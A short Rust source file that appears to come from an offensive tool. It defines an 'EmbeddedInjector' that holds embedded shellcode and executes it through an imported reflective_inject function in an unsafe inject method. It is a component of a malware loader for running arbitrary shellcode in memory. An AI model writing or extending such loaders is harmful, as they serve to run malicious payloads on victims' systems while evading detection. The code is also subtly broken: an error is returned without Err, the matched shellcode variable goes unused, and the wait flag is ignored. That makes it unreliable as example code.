use crate::injectors::{
    Injector,
    InjectorType,
    InjectorError,
    reflective_inject
};

struct EmbeddedInjector {
    shellcode: Option<Vec<u8>>
}

impl EmbeddedInjector {
    pub fn new() -> EmbeddedInjector {
        EmbeddedInjector { shellcode: None }
    }

}

impl Injector for EmbeddedInjector {
    fn load(&self, sc_source: InjectorType) -> Result<EmbeddedInjector, InjectorError> {
        use InjectorType::Embedded;
        match sc_source {
            Embedded(sc) => {
                Ok(EmbeddedInjector { shellcode: Some(sc) })
            }
            _ => InjectorError("Incorrect Shellcode Type!".to_string())
        }
    }

    unsafe fn inject(&self, wait: bool) {

        match self.shellcode {
            Some(sc) => reflective_inject(&self.shellcode, true),
            None => panic!("No shellcode loaded!")
        }
        
    }
}